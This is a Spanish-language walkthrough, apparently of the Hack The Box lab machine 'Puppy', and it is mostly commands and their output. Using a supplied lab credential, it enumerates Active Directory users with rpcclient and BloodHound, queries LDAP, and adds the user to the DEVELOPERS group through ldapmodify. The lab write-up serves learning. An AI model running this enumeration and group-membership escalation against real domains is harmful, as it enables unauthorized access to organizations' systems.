Nos proporcionaran las credenciales del usuario levi.james, procederemos a enumerar los usuarios mediante rpcclient, posteriormente los almacenaremos en un txt por si posteriormente lo necesitamos.
```bash
└─# rpcclient -U levi.james%KingofAkron2025! -W puppy.htb 10.10.11.70
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```

Ahora sincronizaremos la hora con el dominio para evitar posibles problemas, es importante tener la IP apuntando correctamente al dominio en el fichero /etc/hosts
```bash
└─# ntpdate puppy.htb
2025-07-11 13:06:14.736452 (-0400) +25200.486878 +/- 0.026779 puppy.htb 10.10.11.70 s1 no-leap
CLOCK: time stepped by 25200.486878
```

Generearemos un archivo que podamos visualizar en bloodhound
```bash                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/THM/Puppy]
└─# bloodhound-python -u 'levi.james' -p 'KingofAkron2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 11S
INFO: Compressing output into 20250711060801_bloodhound.zip
```
Si recordamos cuando enumeramos los directorios de smb uno de ellos nos decia que 

<img width="1920" height="966" alt="image" src="https://github.com/user-attachments/assets/6ca36421-4f29-4e29-bc17-0f20ca53d21e" />


```bash
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)"
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=levi.james)
# requesting: ALL
#

# Levi B. James, MANPOWER, PUPPY.HTB
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Levi B. James
sn: James
givenName: Levi
initials: B
distinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121056.0Z
whenChanged: 20250711141817.0Z
displayName: Levi B. James
uSNCreated: 12798
memberOf: CN=HR,DC=PUPPY,DC=HTB
uSNChanged: 172196
name: Levi B. James
objectGUID:: 2UDSk6IBfU2UQ8vUlLk8rg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133862719957678511
lastLogoff: 0
lastLogon: 133967278104209708
pwdLastSet: 133844406569969717
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHTwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: levi.james
sAMAccountType: 805306368
managedObjects: OU=MANPOWER,DC=PUPPY,DC=HTB
userPrincipalName: levi.james@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250509173106.0Z
dSCorePropagationData: 20250219131504.0Z
dSCorePropagationData: 16010101000416.0Z
lastLogonTimestamp: 133967170971710058
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
```bash
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=developers)" dn
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=developers)
# requesting: dn 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
```bash
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB

└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif
modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"

└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB" member
# extended LDIF
#
# LDAPv3
# base <CN=DEVELOPERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
member: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/THM/Puppy]
└─# ldapmodify -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -f mod.ldif                           
modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"

                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/THM/Puppy]
└─# nano mod.ldif 
                                                                                                                    
┌──(root㉿kali)-[~/THM/Puppy]
└─# ldapsearch -x -H ldap://puppy.htb -D "puppy\\levi.james" -w 'KingofAkron2025!' -b "CN=DEVELOPERS,DC=PUPPY,DC=HTB
# extended LDIF
#
# LDAPv3
# base <CN=DEVELOPERS,DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectclass=*)
# requesting: member 
#

# DEVELOPERS, PUPPY.HTB
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
member: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
member: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
member: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
